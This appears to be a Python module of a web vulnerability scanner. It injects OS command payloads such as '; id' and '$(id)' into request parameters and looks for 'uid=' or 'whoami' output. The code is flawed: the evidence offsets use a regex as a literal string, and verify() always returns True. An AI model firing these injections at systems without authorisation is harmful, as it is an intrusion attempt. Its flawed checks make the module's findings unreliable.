import asyncio
from .base import AttackModule, register_module, Endpoint, Parameter, ParameterProfile, Finding

@register_module
class CommandInjectionModule(AttackModule):
    module_id = "cmd_injection" 
    vuln_class = "OS_COMMAND_INJECTION"
    severity = "CRITICAL"

    PAYLOADS = [
        "| id",
        "; id",
        "& id",
        "\n id",
        "`id`",
        "$(id)",
        "| whoami",
        "; whoami",
        "& whoami",
    ]

    # Success indicators for Unix/Linux commands
    INDICATORS = [
        r"uid=\d+\(.*\)", # from 'id'
        r"gid=\d+\(.*\)", # from 'id'
        r"groups=\d+\(.*\)", # from 'id'
        r"www-data", # common result of 'whoami'
        r"root", # common result of 'whoami'
        r"apache", # common result of 'whoami'
        r"nginx", # common result of 'whoami'
    ]

    async def run(self, endpoint: Endpoint, param: Parameter, profile: ParameterProfile) -> list[Finding]:
        findings = []
        import re

        for payload in self.PAYLOADS:
            try:
                test_url = endpoint.url
                if param.location == "query":
                    sep = "&" if "?" in test_url else "?"
                    test_url = f"{test_url}{sep}{param.name}={payload}"
                
                if endpoint.method.upper() == "GET":
                    response = await self.http.get(test_url)
                else:
                    response = await self.http.post(endpoint.url, data={param.name: payload})

                for pattern in self.INDICATORS:
                    if re.search(pattern, response.text, re.MULTILINE):
                        request_raw = f"{endpoint.method} {test_url}\nHost: {response.url.host}"
                        finding = self.build_finding(
                            endpoint=endpoint,
                            param=param,
                            payload=payload,
                            request_raw=request_raw,
                            response_raw=response.text,
                            confidence=0.98,
                            evidence={
                                "matched_pattern": pattern,
                                "indicator_context": response.text[max(0, response.text.find(pattern)-50):min(len(response.text), response.text.find(pattern)+50)]
                            }
                        )
                        findings.append(finding)
                        break # Found one match for this payload, move on
            except Exception as e:
                pass

        return findings

    async def verify(self, finding: Finding) -> bool:
        return True
